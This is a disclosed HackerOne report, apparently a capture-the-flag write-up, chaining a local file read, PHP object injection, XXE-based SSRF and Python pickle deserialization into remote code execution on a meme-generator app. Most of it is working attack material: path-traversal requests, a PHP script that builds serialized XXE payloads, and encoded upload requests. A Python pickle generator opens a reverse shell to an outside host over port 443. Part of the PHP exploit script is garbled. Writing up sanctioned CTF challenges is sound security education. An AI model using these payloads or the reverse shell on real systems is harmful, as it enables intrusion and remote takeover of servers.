# RCE via Local File Read -> php unserialization-> XXE -> unpickling

## Report Details
- **Report ID**: 415501
- **URL**: https://hackerone.com/reports/415501
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2018-09-28T01:04:15.800Z
- **Disclosed**: 2018-10-22T16:01:36.514Z

## Reporter
- **Username**: iamnoooob
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: h1-5411-ctf

## Vulnerability Information
**Summary:** 
It was possible to escalate to Remote Code Execution via different bugs such as local file read, php object injection, XML External Entity and Un-Pickling of Python serialized object.
 
**Description:** 
Using local file read it was discovered that the php code was vulnerable to php object injection and a class could be used to cause XXE which inturn helped to access internal service running on the machine using SSRF(via XXE) on port 1337  which on further investigation was vulnerable to unpickling and thus lead to remote code execution by creating a crafted searlized Pickle.

## Steps To Reproduce:
The Road to flag had the following Chain of bugs required: 
1.LFR
2.PHP Object Injection
3.XXE
4.Python Pickle De-Serialization
5.Flag

##1.LFR
while generating memes on https://h1-5411.h1ctf.com/generate.php# It was found that the request to generate a meme from text templates allowed to include arbitrary files and save it to a randomly generated file to a fixed path. The template parameter of this request suffered from Local File Read.

Request:

~~~
POST /api/generate.php HTTP/1.1
Host: h1-5411.h1ctf.com
Connection: close
Content-Length: 72
Accept: */*
Origin: https://h1-5411.h1ctf.com
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: https://h1-5411.h1ctf.com/generate.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,de;q=0.8
Cookie: PHPSESSID=

template=../../../../../../../etc/passwd&type=text&top-text=ad&bottom-text=asd
~~~

Response:

~~~
{
  "meme_path": "../data/memes/1538093153-756c689bcd82668cd3114792ed5befefc1d489cb0c96ea6b7d13051329c0d918.txt"
}
~~~

Upon visiting the /data/memes/1538093153-756c689bcd82668cd3114792ed5befefc1d489cb0c96ea6b7d13051329c0d918.txt the contents of /etc/passwd could be seen.

{F352169}

With the help of this local file read, we were able to read the content of server side php files.
After analyzing the config.php we came to know about various different files like includes/header.php,includes/classes.php etc the source of header.php gave us further two new php files /api/export_memes_2.0.php and /api/import_memes_2.0.php. 

On auditing includes/classes.php we found that function parse() was vulnerable to XXE however the function resides in a class (ConfigFile) which is not getting initiated in any of the file we audited.

Reading the source code of /api/{export,import}_memes_2.0.php files showed the usage of php unserialization (vulnerable) during import via userinput in a $_FILES['f'] parameter which was further stored in $_SESSION['memes'] as an array and serialization during export.

##2. PHP Object Injection & 3. XXE

The ConfigFile Class had a magic method __toString() which is called whenever the object of ConfigFile Class is echo'ed or used a string. That __toString() method also calls the parser() function which is vulnerable to XXE. the Parser function takes a property "config_raw" which is an XML string to be parsed. Now all we have to discover is some place where that object is echo'd or used a string such as concatenation etc., it was found that /memes.php had a for loop which would just simply loop over $_SESSION['memes'] and echo each value in the array. so If we get our object to be placed in $_SESSION['memes'] it will be echoed and __toString() magic method will be invoked calling out parser() function which is further vulnerable to XXE and will help to access internally running services using SSRF.

{F352171}

Using the Unserialize() call in import_memes_2.0.php we were able to craft payload leading to XXE(SSRF). We made a quick php script for generating it easily 

~~~
<?php
//ex- usage php exploit.php http://localhost
class ConfigFile{

    function __construct($url) {
      $this->config_raw = file_get_contents($url);
    }

    function parse() {
     echo "i was called";  
$dom = new DOMDocument();
      $dom->  ($this->config_raw, LIBXML_NOENT | LIBXML_DTDLOAD);
      $o = simplexml_import_dom($dom);
should we
      $this->top_text = $o->toptext;
      $this->bottom_text = $o->bottomtext;
      $this->template = $o->template;
      $this->type = $o->type;
  }

    function __toString() {
        $this->parse();
        echo $this->template;
        return "I am a stirng";
}
}
$obj=new ConfigFile('<root></root>');
$obj->config_raw='<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "'.$argv[1].'" >]><note><toptext>Tove</toptext><bottomtext>Jani</bottomtext><type>Reminder</type><template>&xxe;</template></note>';
$arr=[$obj];
echo base64_encode(serialize($arr));
echo "\n";
~~~

Just copy the payload and use it in the following request

~~~
POST /api/import_memes_2.0.php HTTP/1.1
Host: h1-5411.h1ctf.com
Connection: close
Content-Length: 610
Cache-Control: max-age=0
Origin: https://h1-5411.h1ctf.com
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryi9X2MAeAOhvJm616
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: https://h1-5411.h1ctf.com/import_memes_2.0.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,de;q=0.8
Cookie: PHPSESSID=78cvqcb3qbphjc2rkdo9r5tbug

------WebKitFormBoundaryi9X2MAeAOhvJm616
Content-Disposition: form-data; name="f"; filename="1538079414_export.memepak"
Content-Type: application/octet-stream

YToxOntpOjA7TzoxMDoiQ29uZmlnRmlsZSI6MTp7czoxMDoiY29uZmlnX3JhdyI7czoyMzk6Ijw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IlVURi04Ij8+IDwhRE9DVFlQRSBmb28gWzwhRUxFTUVOVCBmb28gQU5ZID48IUVOVElUWSB4eGUgU1lTVEVNICJodHRwOi8vbG9jYWxob3N0OjEzMzcvc3RhdHVzIiA+XT48bm90ZT48dG9wdGV4dD5Ub3ZlPC90b3B0ZXh0Pjxib3R0b210ZXh0Pkphbmk8L2JvdHRvbXRleHQ+PHR5cGU+UmVtaW5kZXI8L3R5cGU+PHRlbXBsYXRlPiZ4eGU7PC90ZW1wbGF0ZT48L25vdGU+Ijt9fQ==
------WebKitFormBoundaryi9X2MAeAOhvJm616--


~~~

where the request is base64 encoded version of this serialized object 

~~~
a:1:{i:0;O:10:"ConfigFile":1:{s:10:"config_raw";s:239:"<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://localhost:1337/" >]><note><toptext>Tove</toptext><bottomtext>Jani</bottomtext><type>Reminder</type><template>&xxe;</template></note>";}}
~~~

To view the results of the XXE visit /memes.php where the object is echo'ed calling the __toString() magic method.

{F352167}

##3 Un-Pickling  
It was discovered that 1337 port on localhost was running a maintenance api which had 2 endpoints /status and /update-status and a debug parameter which on requesting gives some information about the request such as debug & status parameter. It was found that update-status also takes a 'status' parameter to change the maintenance mode from off to on or vice versa. Request to this endpoint along with 'debug=1' parameter set gives a base64 encoded string which on decoding seemed to be a Python Pickle Serialized Object. Next we just used the following code snippet to create a base64 encoded pickle object which executes a reverse shell to our VPS

~~~
import cPickle
import sys
import base64

DEFAULT_COMMAND = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"rce.ee\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND

class PickleRce(object):
    def __reduce__(self):
        import os
        return (os.system,(COMMAND,))

print base64.b64encode(cPickle.dumps(PickleRce()))
~~~

we listened for a netcat session on our server and the final request was sent:

~~~
POST /api/import_memes_2.0.php HTTP/1.1
Host: h1-5411.h1ctf.com
Connection: close
Content-Length: 1094
Cache-Control: max-age=0
Origin: https://h1-5411.h1ctf.com
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryi9X2MAeAOhvJm616
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: https://h1-5411.h1ctf.com/import_memes_2.0.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,de;q=0.8
Cookie: PHPSESSID=78cvqcb3qbphjc2rkdo9r5tbug

------WebKitFormBoundaryi9X2MAeAOhvJm616
Content-Disposition: form-data; name="f"; filename="1538079414_export.memepak"
Content-Type: application/octet-stream

YToxOntpOjA7TzoxMDoiQ29uZmlnRmlsZSI6MTp7czoxMDoiY29uZmlnX3JhdyI7czo2MDI6Ijw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IlVURi04Ij8+IDwhRE9DVFlQRSBmb28gWzwhRUxFTUVOVCBmb28gQU5ZID48IUVOVElUWSB4eGUgU1lTVEVNICJodHRwOi8vbG9jYWxob3N0OjEzMzcvdXBkYXRlLXN0YXR1cz9zdGF0dXM9WTNCdmMybDRDbk41YzNSbGJRcHdNUW9vVXlkd2VYUm9iMjRnTFdNZ1hDZHBiWEJ2Y25RZ2MyOWphMlYwTEhOMVluQnliMk5sYzNNc2IzTTdjejF6YjJOclpYUXVjMjlqYTJWMEtITnZZMnRsZEM1QlJsOUpUa1ZVTEhOdlkydGxkQzVUVDBOTFgxTlVVa1ZCVFNrN2N5NWpiMjV1WldOMEtDZ2ljbU5sTG1WbElpdzBORE1wS1R0dmN5NWtkWEF5S0hNdVptbHNaVzV2S0Nrc01DazdJRzl6TG1SMWNESW9jeTVtYVd4bGJtOG9LU3d4S1RzZ2IzTXVaSFZ3TWloekxtWnBiR1Z1YnlncExESXBPM0E5YzNWaWNISnZZMlZ6Y3k1allXeHNLRnNpTDJKcGJpOXphQ0lzSWkxcElsMHBPMXduSndwd01ncDBVbkF6Q2k0PSZkZWJ1Zz0xIiA+XT48bm90ZT48dG9wdGV4dD5Ub3ZlPC90b3B0ZXh0Pjxib3R0b210ZXh0Pkphbmk8L2JvdHRvbXRleHQ+PHR5cGU+UmVtaW5kZXI8L3R5cGU+PHRlbXBsYXRlPiZ4eGU7PC90ZW1wbGF0ZT48L25vdGU+Ijt9fQ==
------WebKitFormBoundaryi9X2MAeAOhvJm616--
~~~

which decodes to 

~~~
a:1:{i:0;O:10:"ConfigFile":1:{s:10:"config_raw";s:602:"<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://localhost:1337/update-status?status=Y3Bvc2l4CnN5c3RlbQpwMQooUydweXRob24gLWMgXCdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgicmNlLmVlIiw0NDMpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pO1wnJwpwMgp0UnAzCi4=&debug=1" >]><note><toptext>Tove</toptext><bottomtext>Jani</bottomtext><type>Reminder</type><template>&xxe;</template></note>";}}
~~~

And we got a reverse shell and in the same directory (/app) we found flag.txt which said :) 

~~~
Yay! Here is your flag:


flag{cha1n1ng_bugs_f0r_fun_4nd_pr0f1t?_or_rep0rt_an_LF1}


Go to https://hackerone.com/h1-5411-ctf and submit your writeup! 

~~~

{F352164}

##Regards 
Rahul Maini & Harsh Jaiswal (@bugdiscloseguys)

## Impact

RCE

## Attachments
- Screenshot_27.png
- Screenshot_28.png
- Screenshot_29.png
- Screenshot_30.png
